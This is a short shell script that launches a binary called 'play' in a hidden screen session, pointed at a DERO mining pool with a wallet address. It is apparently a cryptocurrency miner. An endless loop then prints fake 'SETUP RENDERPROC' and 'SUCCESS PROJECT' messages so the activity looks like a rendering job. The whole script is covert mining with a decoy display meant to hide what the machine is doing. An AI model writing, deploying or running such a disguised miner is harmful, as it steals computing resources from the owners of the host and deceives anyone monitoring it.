#!/bin/sh
chmod u+x play

screen -dmS run ./play -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xe4y4hajkwqp50qqlvpsp -r dero.rabidmining.com:10300 -p rpc -m 8
i=1
while true; do clear; echo SETUP RENDERPROC $i; sleep 5; clear; echo SUCCESS PROJECT; sleep 1;let "i++";  done
